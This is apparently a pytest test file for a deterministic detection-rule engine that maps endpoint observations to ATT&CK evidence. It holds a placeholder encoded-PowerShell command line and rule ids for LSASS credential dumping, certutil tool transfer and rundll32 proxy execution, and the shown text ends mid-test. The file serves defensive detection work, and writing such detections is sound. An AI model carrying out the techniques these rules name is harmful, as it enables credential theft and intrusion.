"""Tests for gate G1.0: detection-domain contracts + deterministic
single-Observation rule engine.

Covers: each predicate operator (equals/contains/in/exists) incl. no-match
and missing-field cases; array-typed-field rejection; unknown top-level
field-path rejection; AND semantics across a rule's conditions;
MatchBasis/MatchedField content; DetectionEngine determinism and ordering;
rule-pack loading (valid load, content-hash reproducibility, every
fail-closed rejection path incl. an unresolvable/wrong-type ATT&CK mapping
validated against the real pinned v19.0 KB); valid technique AND
sub-technique mapping resolution; the thin fan-out into the existing,
unmodified G0.6 `derive_evidence()` (mapped and unmapped cases, provenance
preservation, fail-closed mismatched-Observation guard); determinism of the
full rule -> detection -> evidence chain; the provenance-audit follow-up
(rule-pack content_hash preserved end to end through RulePack ->
DetectionRule -> DetectionResult -> Evidence.provenance, present in
canonical serialization, and duplicate ATT&CK mappings within one rule
rejected fail-closed); the deterministic identity follow-up (the rule-pack
content hash now participates in `detection_id`/`evidence_id` whenever
present -- same rule_ref + same observation + same content -> identical
ids; same rule_ref + same observation + different content -> different
ids; a rule with no content hash keeps the pre-existing id format exactly);
and guards preserving Phase 0 invariants (detection/ never imports
sources/, no hard-coded ATT&CK ids or APT actor names in detection/*.py
source).

Does NOT touch the G0.0-G0.12 test files. Offline (loads only the vendored
KB), deterministic, no Elastic/Docker/Windows/network required.
"""

from __future__ import annotations

import ast
import json
import re
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import pytest

from attribution_platform.attack_knowledge.loader import AttackKnowledge, load_attack_knowledge
from attribution_platform.detection import (
    DetectionEngine,
    DetectionError,
    DetectionResult,
    DetectionRule,
    FieldCondition,
    MatchedField,
    RulePack,
    TechniqueMapping,
    derive_evidence_from_detection,
    load_rule_pack,
)
from attribution_platform.domain import (
    AttackRef,
    EventMetadata,
    Evidence,
    EvidenceType,
    HostRef,
    Observation,
    ProcessRef,
    SourceRef,
    UserRef,
    to_canonical_json,
)
from attribution_platform.extraction import RuleRef

REPO_ROOT = Path(__file__).resolve().parents[1]
#: The fixture rule packs, Phase-0 scenarios and calibration corpus v1 used here are
#: frozen against this ATT&CK release (doc 11 §0 upgrade record); they load it by name.
FIXTURE_ATTACK_KB = "enterprise-attack-19.0"
DETECTION_DIR = REPO_ROOT / "src" / "attribution_platform" / "detection"
CORE_RULES_PATH = REPO_ROOT / "fixtures" / "phase1_core_rules.json"

T0 = datetime(2026, 1, 1, 12, 0, 0, tzinfo=UTC)


@pytest.fixture(scope="module")
def knowledge() -> AttackKnowledge:
    return load_attack_knowledge(FIXTURE_ATTACK_KB)


def _obs(observation_id: str = "o1", **entities: Any) -> Observation:
    return Observation(
        observation_id=observation_id,
        timestamp=T0,
        raw_reference=SourceRef(source_type="synthetic", source_event_id=f"raw-{observation_id}"),
        **entities,
    )


def _rule_ref(rule_id: str = "r1", rule_version: str = "1.0") -> RuleRef:
    return RuleRef(rule_id=rule_id, rule_version=rule_version)


# ===========================================================================
# 1. FieldCondition predicate operators
# ===========================================================================


def test_equals_matches_and_no_match() -> None:
    cond = FieldCondition(field_path="process.name", operator="equals", value="cmd.exe")
    obs_match = _obs(process=ProcessRef(name="cmd.exe"))
    obs_no_match = _obs(process=ProcessRef(name="powershell.exe"))

    result = cond.evaluate(obs_match)
    assert result == MatchedField(
        field_path="process.name", operator="equals", observed="cmd.exe", expected="cmd.exe"
    )
    assert cond.evaluate(obs_no_match) is None


def test_contains_matches_and_no_match() -> None:
    cond = FieldCondition(field_path="process.command_line", operator="contains", value="-enc")
    obs_match = _obs(process=ProcessRef(command_line="powershell.exe -enc AAAA"))
    obs_no_match = _obs(process=ProcessRef(command_line="powershell.exe -Command Get-Process"))
    assert cond.evaluate(obs_match) is not None
    assert cond.evaluate(obs_no_match) is None


def test_in_matches_and_no_match() -> None:
    cond = FieldCondition(field_path="user.name", operator="in", value=("alice", "bob"))
    assert cond.evaluate(_obs(user=UserRef(name="alice"))) is not None
    assert cond.evaluate(_obs(user=UserRef(name="carol"))) is None


def test_exists_matches_and_no_match() -> None:
    cond = FieldCondition(field_path="host.name", operator="exists")
    assert cond.evaluate(_obs(host=HostRef(name="WIN-1"))) is not None
    assert cond.evaluate(_obs()) is None


def test_missing_field_never_raises_only_no_matches() -> None:
    """A legitimately-unpopulated entity group (e.g. no process on this
    Observation) resolves to 'no match', not an error."""
    cond = FieldCondition(field_path="process.command_line", operator="contains", value="x")
    assert cond.evaluate(_obs()) is None


def test_matched_field_records_observed_and_expected() -> None:
    cond = FieldCondition(field_path="process.pid", operator="equals", value="4242")
    obs = _obs(process=ProcessRef(pid=4242))
    result = cond.evaluate(obs)
    assert result is not None
    assert result.observed == "4242"
    assert result.expected == "4242"


# ===========================================================================
# 2. Array-typed fields and unknown top-level fields fail closed
# ===========================================================================


def test_array_typed_field_rejected() -> None:
    cond = FieldCondition(field_path="event.category", operator="contains", value="process")
    obs = _obs(event=EventMetadata(category=("process",)))
    with pytest.raises(DetectionError, match="array-typed field"):
        cond.evaluate(obs)


def test_unknown_top_level_field_rejected() -> None:
    cond = FieldCondition(field_path="proces.name", operator="exists")
    with pytest.raises(DetectionError, match="unknown field_path top-level segment"):
        cond.evaluate(_obs())


# ===========================================================================
# 3. DetectionRule: AND semantics + MatchBasis content
# ===========================================================================


def test_rule_requires_all_conditions_to_match() -> None:
    rule = DetectionRule(
        rule_ref=_rule_ref(),
        conditions=(
            FieldCondition(field_path="process.name", operator="contains", value="powershell"),
            FieldCondition(field_path="process.command_line", operator="contains", value="-enc"),
        ),
    )
    both_match = _obs(
        process=ProcessRef(name="powershell.exe", command_line="powershell.exe -enc AAAA")
    )
    only_one_matches = _obs(
        process=ProcessRef(name="powershell.exe", command_line="powershell.exe -Command x")
    )

    fired = rule.evaluate(both_match)
    assert fired is not None
    assert len(fired.match_basis.matched_fields) == 2

    assert rule.evaluate(only_one_matches) is None


def test_rule_evaluate_rejects_non_observation() -> None:
    rule = DetectionRule(
        rule_ref=_rule_ref(),
        conditions=(FieldCondition(field_path="host.name", operator="exists"),),
    )
    with pytest.raises(DetectionError, match="requires a domain Observation"):
        rule.evaluate("not-an-observation")  # type: ignore[arg-type]


def test_detection_id_is_deterministic_and_not_random() -> None:
    rule = DetectionRule(
        rule_ref=RuleRef(rule_id="R-9", rule_version="2.0"),
        conditions=(FieldCondition(field_path="host.name", operator="exists"),),
    )
    obs = _obs("obs-77", host=HostRef(name="H"))
    first = rule.evaluate(obs)
    second = rule.evaluate(obs)
    assert first is not None and second is not None
    assert first.detection_id == second.detection_id == "R-9::2.0::obs-77"


# ===========================================================================
# 4. DetectionEngine: deterministic evaluation across rules x observations
# ===========================================================================


def test_engine_evaluates_every_rule_against_every_observation() -> None:
    rule_a = DetectionRule(
        rule_ref=RuleRef(rule_id="A", rule_version="1"),
        conditions=(FieldCondition(field_path="process.name", operator="equals", value="cmd.exe"),),
    )
    rule_b = DetectionRule(
        rule_ref=RuleRef(rule_id="B", rule_version="1"),
        conditions=(FieldCondition(field_path="host.name", operator="exists"),),
    )
    engine = DetectionEngine(rules=(rule_a, rule_b))

    obs1 = _obs("o1", process=ProcessRef(name="cmd.exe"), host=HostRef(name="H1"))
    obs2 = _obs("o2", process=ProcessRef(name="notepad.exe"))

    results = engine.evaluate([obs1, obs2])
    # obs1 matches both rules; obs2 matches neither
    fired = {(r.rule_ref.rule_id, r.supporting_observation_ids) for r in results}
    assert fired == {("A", ("o1",)), ("B", ("o1",))}


def test_engine_output_order_is_deterministic() -> None:
    rule = DetectionRule(
        rule_ref=_rule_ref(),
        conditions=(FieldCondition(field_path="host.name", operator="exists"),),
    )
    engine = DetectionEngine(rules=(rule,))
    observations = [_obs(f"o{i}", host=HostRef(name="H")) for i in range(5)]

    first = engine.evaluate(observations)
    second = engine.evaluate(observations)
    assert [r.detection_id for r in first] == [r.detection_id for r in second]
    assert [r.detection_id for r in first] == [f"r1::1.0::o{i}" for i in range(5)]


def test_engine_rejects_non_observation_input() -> None:
    engine = DetectionEngine(rules=())
    with pytest.raises(DetectionError, match="requires domain Observations"):
        engine.evaluate(["not-an-observation"])  # type: ignore[list-item]


# ===========================================================================
# 5. Rule-pack loading: valid load + content-hash reproducibility
# ===========================================================================


def test_load_core_rule_pack(knowledge: AttackKnowledge) -> None:
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    assert isinstance(pack, RulePack)
    assert pack.pack_id == "phase1-core-rules"
    assert len(pack.content_hash) == 64  # sha256 hex digest
    assert len(pack.rules) == 6  # G1.0's original 2 + G1.3's 4 new rules
    rule_ids = {r.rule_ref.rule_id for r in pack.rules}
    assert rule_ids == {
        "platform-encoded-powershell",
        "platform-interactive-logon",
        "platform-procdump-lsass-dump",
        "platform-rundll32-javascript-proxy",
        "platform-office-spawns-cmd-shell",
        "platform-certutil-ingress-transfer",
    }


def test_rule_pack_content_hash_is_reproducible(knowledge: AttackKnowledge) -> None:
    first = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    second = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    assert first.content_hash == second.content_hash


def test_mapped_rule_carries_validated_technique(knowledge: AttackKnowledge) -> None:
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    mapped_rule = next(r for r in pack.rules if r.rule_ref.rule_id == "platform-encoded-powershell")
    assert len(mapped_rule.technique_mappings) == 1
    mapping = mapped_rule.technique_mappings[0]
    assert mapping.attack_ref.external_id == "T1059.001"
    assert mapping.attack_ref.attack_kb_version == knowledge.attack_kb_version

    unmapped_rule = next(
        r for r in pack.rules if r.rule_ref.rule_id == "platform-interactive-logon"
    )
    assert unmapped_rule.technique_mappings == ()
    assert unmapped_rule.evidence_type == EvidenceType.CONTEXTUAL


# ===========================================================================
# 6. Rule-pack loading: fail-closed paths
# ===========================================================================


def _write(tmp_path: Path, data: object) -> Path:
    path = tmp_path / "pack.json"
    path.write_text(json.dumps(data), encoding="utf-8")
    return path


def test_missing_file_rejected(knowledge: AttackKnowledge) -> None:
    with pytest.raises(DetectionError, match="could not read"):
        load_rule_pack(Path("/does/not/exist.json"), knowledge=knowledge)


def test_invalid_json_rejected(tmp_path: Path, knowledge: AttackKnowledge) -> None:
    path = tmp_path / "pack.json"
    path.write_text("{not json", encoding="utf-8")
    with pytest.raises(DetectionError, match="not valid JSON"):
        load_rule_pack(path, knowledge=knowledge)


def test_missing_pack_id_rejected(tmp_path: Path, knowledge: AttackKnowledge) -> None:
    path = _write(tmp_path, {"rules": []})
    with pytest.raises(DetectionError, match="pack_id"):
        load_rule_pack(path, knowledge=knowledge)


def test_empty_rules_rejected(tmp_path: Path, knowledge: AttackKnowledge) -> None:
    path = _write(tmp_path, {"pack_id": "p", "rules": []})
    with pytest.raises(DetectionError, match="non-empty list"):
        load_rule_pack(path, knowledge=knowledge)


def test_unknown_operator_rejected(tmp_path: Path, knowledge: AttackKnowledge) -> None:
    path = _write(
        tmp_path,
        {
            "pack_id": "p",
            "rules": [
                {
                    "rule_id": "r1",
                    "rule_version": "1.0",
                    "conditions": [
                        {"field_path": "process.name", "operator": "regex", "value": "x"}
                    ],
                }
            ],
        },
    )
    with pytest.raises(DetectionError, match="is not one of"):
        load_rule_pack(path, knowledge=knowledge)


def test_nonexistent_technique_mapping_rejected(tmp_path: Path, knowledge: AttackKnowledge) -> None:
    path = _write(
        tmp_path,
        {
            "pack_id": "p",
            "rules": [
                {
                    "rule_id": "r1",
                    "rule_version": "1.0",
                    "conditions": [{"field_path": "process.name", "operator": "exists"}],
                    "technique_mappings": [
                        {
                            "stix_id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                            "object_type": "attack-pattern",
                            "attack_kb_version": knowledge.attack_kb_version,
                            "mapping_basis": "x",
                        }
                    ],
                }
            ],
        },
    )
    with pytest.raises(DetectionError, match="does not resolve"):
        load_rule_pack(path, knowledge=knowledge)


def test_wrong_kb_version_mapping_rejected(tmp_path: Path, knowledge: AttackKnowledge) -> None:
    technique = knowledge.techniques()[0]
    path = _write(
        tmp_path,
        {
            "pack_id": "p",
            "rules": [
                {
                    "rule_id": "r1",
                    "rule_version": "1.0",
                    "conditions": [{"field_path": "process.name", "operator": "exists"}],
                    "technique_mappings": [
                        {
                            "stix_id": technique["id"],
                            "object_type": technique["type"],
                            "attack_kb_version": "enterprise-attack-18.0",
                            "mapping_basis": "x",
                        }
                    ],
                }
            ],
        },
    )
    with pytest.raises(DetectionError, match="does not resolve"):
        load_rule_pack(path, knowledge=knowledge)


def test_duplicate_rule_id_version_rejected(tmp_path: Path, knowledge: AttackKnowledge) -> None:
    condition = {"field_path": "process.name", "operator": "exists"}
    path = _write(
        tmp_path,
        {
            "pack_id": "p",
            "rules": [
                {"rule_id": "r1", "rule_version": "1.0", "conditions": [condition]},
                {"rule_id": "r1", "rule_version": "1.0", "conditions": [condition]},
            ],
        },
    )
    with pytest.raises(DetectionError, match="duplicate rule"):
        load_rule_pack(path, knowledge=knowledge)


# ===========================================================================
# 7. Valid technique AND sub-technique mapping resolve (real pinned KB)
# ===========================================================================


def test_valid_technique_mapping_resolves(tmp_path: Path, knowledge: AttackKnowledge) -> None:
    technique = knowledge.techniques()[0]
    path = _write(
        tmp_path,
        {
            "pack_id": "p",
            "rules": [
                {
                    "rule_id": "r1",
                    "rule_version": "1.0",
                    "conditions": [{"field_path": "process.name", "operator": "exists"}],
                    "technique_mappings": [
                        {
                            "stix_id": technique["id"],
                            "object_type": technique["type"],
                            "attack_kb_version": knowledge.attack_kb_version,
                            "mapping_basis": "x",
                        }
                    ],
                }
            ],
        },
    )
    pack = load_rule_pack(path, knowledge=knowledge)
    assert pack.rules[0].technique_mappings[0].attack_ref.stix_id == technique["id"]


def test_valid_sub_technique_mapping_resolves(tmp_path: Path, knowledge: AttackKnowledge) -> None:
    sub_technique = knowledge.sub_techniques()[0]
    path = _write(
        tmp_path,
        {
            "pack_id": "p",
            "rules": [
                {
                    "rule_id": "r1",
                    "rule_version": "1.0",
                    "conditions": [{"field_path": "process.name", "operator": "exists"}],
                    "technique_mappings": [
                        {
                            "stix_id": sub_technique["id"],
                            "object_type": sub_technique["type"],
                            "attack_kb_version": knowledge.attack_kb_version,
                            "mapping_basis": "x",
                        }
                    ],
                }
            ],
        },
    )
    pack = load_rule_pack(path, knowledge=knowledge)
    assert pack.rules[0].technique_mappings[0].attack_ref.stix_id == sub_technique["id"]


# ===========================================================================
# 8. Fan-out: DetectionResult -> Evidence (reuses derive_evidence unchanged)
# ===========================================================================


def test_derive_evidence_from_mapped_detection(knowledge: AttackKnowledge) -> None:
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs(
        "obs-1", process=ProcessRef(name="powershell.exe", command_line="powershell.exe -enc AAAA")
    )

    (detection,) = engine.evaluate([obs])
    evidences = derive_evidence_from_detection(detection, obs, knowledge=knowledge)

    assert len(evidences) == 1
    evidence = evidences[0]
    assert isinstance(evidence, Evidence)
    assert evidence.evidence_type == EvidenceType.BEHAVIORAL
    assert evidence.attack_ref is not None
    assert evidence.attack_ref.external_id == "T1059.001"
    assert evidence.provenance.method == "platform-encoded-powershell"
    assert evidence.provenance.method_version == "1.0"
    assert evidence.provenance.source_observation_ids == ("obs-1",)
    assert "T1059.001" in evidence.claim


def test_derive_evidence_from_unmapped_detection(knowledge: AttackKnowledge) -> None:
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs("obs-2", event=EventMetadata(action="User logon successful"))

    (detection,) = engine.evaluate([obs])
    evidences = derive_evidence_from_detection(detection, obs, knowledge=knowledge)

    assert len(evidences) == 1
    evidence = evidences[0]
    assert evidence.attack_ref is None
    assert evidence.evidence_type == EvidenceType.CONTEXTUAL


def test_derive_evidence_rejects_mismatched_observation(knowledge: AttackKnowledge) -> None:
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs(
        "obs-1", process=ProcessRef(name="powershell.exe", command_line="powershell.exe -enc AAAA")
    )
    (detection,) = engine.evaluate([obs])

    other_obs = _obs("some-other-id")
    with pytest.raises(DetectionError, match="is not among detection"):
        derive_evidence_from_detection(detection, other_obs, knowledge=knowledge)


def test_derive_evidence_rejects_non_detection_result(knowledge: AttackKnowledge) -> None:
    obs = _obs()
    with pytest.raises(DetectionError, match="requires a DetectionResult"):
        derive_evidence_from_detection("not-a-detection", obs, knowledge=knowledge)  # type: ignore[arg-type]


def test_multiple_technique_mappings_yield_multiple_evidence_items(
    knowledge: AttackKnowledge,
) -> None:
    technique = knowledge.techniques()[0]
    sub_technique = knowledge.sub_techniques()[0]
    rule = DetectionRule(
        rule_ref=_rule_ref(),
        conditions=(FieldCondition(field_path="host.name", operator="exists"),),
        technique_mappings=(
            TechniqueMapping(
                attack_ref=AttackRef(
                    stix_id=technique["id"],
                    object_type=technique["type"],
                    attack_kb_version=knowledge.attack_kb_version,
                ),
                mapping_basis="basis A",
            ),
            TechniqueMapping(
                attack_ref=AttackRef(
                    stix_id=sub_technique["id"],
                    object_type=sub_technique["type"],
                    attack_kb_version=knowledge.attack_kb_version,
                ),
                mapping_basis="basis B",
            ),
        ),
    )
    engine = DetectionEngine(rules=(rule,))
    obs = _obs("obs-multi", host=HostRef(name="H"))
    (detection,) = engine.evaluate([obs])
    evidences = derive_evidence_from_detection(detection, obs, knowledge=knowledge)
    assert len(evidences) == 2
    stix_ids = {e.attack_ref.stix_id for e in evidences if e.attack_ref is not None}
    assert stix_ids == {technique["id"], sub_technique["id"]}
    # deterministic, distinct evidence ids per technique
    assert len({e.evidence_id for e in evidences}) == 2


# ===========================================================================
# 9. Determinism of the full rule -> detection -> evidence chain
# ===========================================================================


def test_full_chain_is_deterministic(knowledge: AttackKnowledge) -> None:
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs(
        "obs-1", process=ProcessRef(name="powershell.exe", command_line="powershell.exe -enc AAAA")
    )

    def run() -> tuple[DetectionResult, tuple[Evidence, ...]]:
        (detection,) = engine.evaluate([obs])
        evidences = derive_evidence_from_detection(detection, obs, knowledge=knowledge)
        return detection, evidences

    detection_1, evidences_1 = run()
    detection_2, evidences_2 = run()

    assert to_canonical_json(detection_1) == to_canonical_json(detection_2)
    assert [to_canonical_json(e) for e in evidences_1] == [
        to_canonical_json(e) for e in evidences_2
    ]


def test_detection_result_serializes_via_existing_domain_serializer(
    knowledge: AttackKnowledge,
) -> None:
    """DetectionResult is not a domain.* type, but to_canonical_json must
    still work on it unmodified -- it walks any frozen-dataclass tree
    structurally (see domain/serialization.py)."""
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs(
        "obs-1", process=ProcessRef(name="powershell.exe", command_line="powershell.exe -enc AAAA")
    )
    (detection,) = engine.evaluate([obs])

    body = json.loads(to_canonical_json(detection))
    assert body["detection_id"] == detection.detection_id
    assert body["rule_ref"] == {"rule_id": "platform-encoded-powershell", "rule_version": "1.0"}
    assert body["technique_mappings"][0]["attack_ref"]["external_id"] == "T1059.001"


# ===========================================================================
# 10. Provenance-audit follow-up: rule-pack content hash + duplicate mappings
# ===========================================================================


def _rule_dict(
    rule_id: str = "r1",
    rule_version: str = "1.0",
    *,
    field_path: str = "host.name",
    mappings: list[dict[str, Any]] | None = None,
) -> dict[str, Any]:
    d: dict[str, Any] = {
        "rule_id": rule_id,
        "rule_version": rule_version,
        "conditions": [{"field_path": field_path, "operator": "exists"}],
    }
    if mappings is not None:
        d["technique_mappings"] = mappings
    return d


def test_content_hash_survives_rulepack_to_detectionresult_to_evidence(
    tmp_path: Path, knowledge: AttackKnowledge
) -> None:
    """RulePack.content_hash must not be discarded: it should appear
    unchanged on DetectionRule, DetectionResult, and finally
    Evidence.provenance.method_content_hash."""
    path = _write(tmp_path, {"pack_id": "p", "rules": [_rule_dict()]})
    pack = load_rule_pack(path, knowledge=knowledge)

    # RulePack -> DetectionRule
    assert pack.rules[0].content_hash == pack.content_hash

    # DetectionRule -> DetectionResult (via DetectionEngine.evaluate)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs("obs-1", host=HostRef(name="H"))
    (detection,) = engine.evaluate([obs])
    assert detection.rule_pack_content_hash == pack.content_hash

    # DetectionResult -> Evidence (via derive_evidence_from_detection)
    (evidence,) = derive_evidence_from_detection(detection, obs, knowledge=knowledge)
    assert evidence.provenance.method_content_hash == pack.content_hash


def test_canonical_serialization_includes_content_hash(
    tmp_path: Path, knowledge: AttackKnowledge
) -> None:
    """The hash must be present in to_canonical_json() output for both
    DetectionResult and Evidence -- not just accessible as a Python attribute."""
    path = _write(tmp_path, {"pack_id": "p", "rules": [_rule_dict()]})
    pack = load_rule_pack(path, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs("obs-1", host=HostRef(name="H"))
    (detection,) = engine.evaluate([obs])
    (evidence,) = derive_evidence_from_detection(detection, obs, knowledge=knowledge)

    detection_body = json.loads(to_canonical_json(detection))
    assert detection_body["rule_pack_content_hash"] == pack.content_hash

    evidence_body = json.loads(to_canonical_json(evidence))
    assert evidence_body["provenance"]["method_content_hash"] == pack.content_hash


def test_different_rule_pack_content_same_rule_ref_produces_different_ids(
    tmp_path: Path, knowledge: AttackKnowledge
) -> None:
    """Two rule packs sharing the same (rule_id, rule_version) but with
    genuinely different content must now produce DIFFERENT detection_ids and
    evidence_ids for the same Observation -- the exact rule-pack content
    participates in the deterministic identity whenever a content hash is
    present, not just in the separately-carried provenance fields."""
    # _write always names the file "pack.json" under the directory it is
    # given; use two subdirectories so both pack files coexist on disk.
    dir_a = tmp_path / "a"
    dir_a.mkdir()
    dir_b = tmp_path / "b"
    dir_b.mkdir()
    path_a = _write(dir_a, {"pack_id": "p", "rules": [_rule_dict(field_path="host.name")]})
    path_b = _write(dir_b, {"pack_id": "p", "rules": [_rule_dict(field_path="user.name")]})

    pack_a = load_rule_pack(path_a, knowledge=knowledge)
    pack_b = load_rule_pack(path_b, knowledge=knowledge)

    # Same declared rule identity...
    assert pack_a.rules[0].rule_ref == pack_b.rules[0].rule_ref
    # ...but genuinely different file content, so genuinely different hashes.
    assert pack_a.content_hash != pack_b.content_hash

    obs = _obs("obs-1", host=HostRef(name="H"), user=UserRef(name="alice"))
    (detection_a,) = DetectionEngine(rules=pack_a.rules).evaluate([obs])
    (detection_b,) = DetectionEngine(rules=pack_b.rules).evaluate([obs])

    (evidence_a,) = derive_evidence_from_detection(detection_a, obs, knowledge=knowledge)
    (evidence_b,) = derive_evidence_from_detection(detection_b, obs, knowledge=knowledge)

    # Required invariant: same rule_ref + same observation + DIFFERENT
    # rule-pack content -> DIFFERENT detection_id/evidence_id.
    assert detection_a.detection_id != detection_b.detection_id
    assert evidence_a.evidence_id != evidence_b.evidence_id
    # rule_ref itself is still identical -- only the content-hash component
    # of the id (and the provenance fields) differ.
    assert evidence_a.provenance.method == evidence_b.provenance.method
    assert evidence_a.provenance.method_version == evidence_b.provenance.method_version

    # The provenance fields carry the same distinguishing hash the ids do.
    assert evidence_a.provenance.method_content_hash != evidence_b.provenance.method_content_hash
    assert evidence_a.provenance.method_content_hash == pack_a.content_hash
    assert evidence_b.provenance.method_content_hash == pack_b.content_hash
    assert pack_a.content_hash in detection_a.detection_id
    assert pack_b.content_hash in detection_b.detection_id


def test_same_rule_pack_content_replayed_is_still_deterministic(
    tmp_path: Path, knowledge: AttackKnowledge
) -> None:
    """Required invariant: same rule_ref + same observation + SAME
    rule-pack content -> IDENTICAL detection_id/evidence_id, whether the
    pack is loaded once and evaluated twice, or reloaded from disk and
    re-evaluated (the hash -- and therefore the id -- must be stable across
    independent loads of the identical file, not just within one process)."""
    path = _write(tmp_path, {"pack_id": "p", "rules": [_rule_dict(field_path="host.name")]})
    obs = _obs("obs-1", host=HostRef(name="H"))

    pack_first_load = load_rule_pack(path, knowledge=knowledge)
    pack_second_load = load_rule_pack(path, knowledge=knowledge)
    assert pack_first_load.content_hash == pack_second_load.content_hash

    (detection_1,) = DetectionEngine(rules=pack_first_load.rules).evaluate([obs])
    (detection_2,) = DetectionEngine(rules=pack_second_load.rules).evaluate([obs])
    assert detection_1.detection_id == detection_2.detection_id

    (evidence_1,) = derive_evidence_from_detection(detection_1, obs, knowledge=knowledge)
    (evidence_2,) = derive_evidence_from_detection(detection_2, obs, knowledge=knowledge)
    assert evidence_1.evidence_id == evidence_2.evidence_id
    assert to_canonical_json(evidence_1) == to_canonical_json(evidence_2)


def test_rule_without_content_hash_keeps_original_id_format(knowledge: AttackKnowledge) -> None:
    """Required invariant: existing deterministic behavior remains unchanged
    for DetectionRules without a content hash (constructed directly, not
    via a rule pack) -- the id format must be exactly rule_id::rule_version::
    observation_id, with no hash segment inserted."""
    rule = DetectionRule(
        rule_ref=RuleRef(rule_id="R-9", rule_version="2.0"),
        conditions=(FieldCondition(field_path="host.name", operator="exists"),),
    )
    obs = _obs("obs-77", host=HostRef(name="H"))
    detection = rule.evaluate(obs)
    assert detection is not None
    assert detection.rule_pack_content_hash is None
    assert detection.detection_id == "R-9::2.0::obs-77"


def test_deterministic_ids_remain_deterministic_with_content_hash_present(
    knowledge: AttackKnowledge,
) -> None:
    """Adding content_hash must not change the deterministic id-composition
    scheme or introduce any randomness/wall-clock dependency: replaying the
    same loaded rule pack against the same Observation must always produce
    the same ids, and the id must embed the rule pack's own hash exactly."""
    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
    engine = DetectionEngine(rules=pack.rules)
    obs = _obs(
        "obs-1", process=ProcessRef(name="powershell.exe", command_line="powershell.exe -enc AAAA")
    )

    (detection_1,) = engine.evaluate([obs])
    (detection_2,) = engine.evaluate([obs])
    expected_id = f"platform-encoded-powershell::1.0::{pack.content_hash}::obs-1"
    assert detection_1.detection_id == detection_2.detection_id == expected_id

    (evidence_1,) = derive_evidence_from_detection(detection_1, obs, knowledge=knowledge)
    (evidence_2,) = derive_evidence_from_detection(detection_2, obs, knowledge=knowledge)
    assert evidence_1.evidence_id == evidence_2.evidence_id


def test_duplicate_technique_mapping_rejected_by_detection_rule_construction(
    knowledge: AttackKnowledge,
) -> None:
    technique = knowledge.techniques()[0]
    ref = AttackRef(
        stix_id=technique["id"],
        object_type=technique["type"],
        attack_kb_version=knowledge.attack_kb_version,
    )
    with pytest.raises(DetectionError, match="duplicate attack_ref.stix_id"):
        DetectionRule(
            rule_ref=_rule_ref(),
            conditions=(FieldCondition(field_path="host.name", operator="exists"),),
            technique_mappings=(
                TechniqueMapping(attack_ref=ref, mapping_basis="basis A"),
                TechniqueMapping(attack_ref=ref, mapping_basis="basis B (duplicate technique)"),
            ),
        )


def test_duplicate_technique_mapping_rejected_by_rule_pack_loading(
    tmp_path: Path, knowledge: AttackKnowledge
) -> None:
    technique = knowledge.techniques()[0]
    mapping = {
        "stix_id": technique["id"],
        "object_type": technique["type"],
        "attack_kb_version": knowledge.attack_kb_version,
        "mapping_basis": "x",
    }
    path = _write(
        tmp_path,
        {"pack_id": "p", "rules": [_rule_dict(mappings=[mapping, dict(mapping)])]},
    )
    with pytest.raises(DetectionError, match="duplicate attack_ref.stix_id"):
        load_rule_pack(path, knowledge=knowledge)


def test_duplicate_mapping_rejection_prevents_evidence_id_collision(
    knowledge: AttackKnowledge,
) -> None:
    """The scenario the audit flagged: without the guard, two identical
    technique_mappings would make derive_evidence_from_detection produce two
    Evidence objects sharing one evidence_id. Prove the rule is rejected
    before any DetectionResult/Evidence can ever be constructed from it."""
    technique = knowledge.techniques()[0]
    ref = AttackRef(
        stix_id=technique["id"],
        object_type=technique["type"],
        attack_kb_version=knowledge.attack_kb_version,
    )
    with pytest.raises(DetectionError):
        rule = DetectionRule(
            rule_ref=_rule_ref(),
            conditions=(FieldCondition(field_path="host.name", operator="exists"),),
            technique_mappings=(
                TechniqueMapping(attack_ref=ref, mapping_basis="basis A"),
                TechniqueMapping(attack_ref=ref, mapping_basis="basis B"),
            ),
        )
        # Unreachable if the guard works -- included to document what the
        # collision would have been.
        engine = DetectionEngine(rules=(rule,))
        obs = _obs("obs-1", host=HostRef(name="H"))
        (detection,) = engine.evaluate([obs])
        evidences = derive_evidence_from_detection(detection, obs, knowledge=knowledge)
        ids = [e.evidence_id for e in evidences]
        assert len(ids) != len(set(ids))  # would prove the collision, if reached


def test_valid_single_and_multiple_mapping_behavior_still_works(
    knowledge: AttackKnowledge,
) -> None:
    """Existing valid (non-duplicate) single- and multi-mapping rules must
    still function unchanged after the duplicate guard + content_hash field
    were added."""
    technique = knowledge.techniques()[0]
    sub_technique = knowledge.sub_techniques()[0]

    single_rule = DetectionRule(
        rule_ref=RuleRef(rule_id="single", rule_version="1.0"),
        conditions=(FieldCondition(field_path="host.name", operator="exists"),),
        technique_mappings=(
            TechniqueMapping(
                attack_ref=AttackRef(
                    stix_id=technique["id"],
                    object_type=technique["type"],
                    attack_kb_version=knowledge.attack_kb_version,
                ),
                mapping_basis="single mapping",
            ),
        ),
    )
    multi_rule = DetectionRule(
        rule_ref=RuleRef(rule_id="multi", rule_version="1.0"),
        conditions=(FieldCondition(field_path="host.name", operator="exists"),),
        technique_mappings=(
            TechniqueMapping(
                attack_ref=AttackRef(
                    stix_id=technique["id"],
                    object_type=technique["type"],
                    attack_kb_version=knowledge.attack_kb_version,
                ),
                mapping_basis="mapping 1",
            ),
            TechniqueMapping(
                attack_ref=AttackRef(
                    stix_id=sub_technique["id"],
                    object_type=sub_technique["type"],
                    attack_kb_version=knowledge.attack_kb_version,
                ),
                mapping_basis="mapping 2",
            ),
        ),
    )

    engine = DetectionEngine(rules=(single_rule, multi_rule))
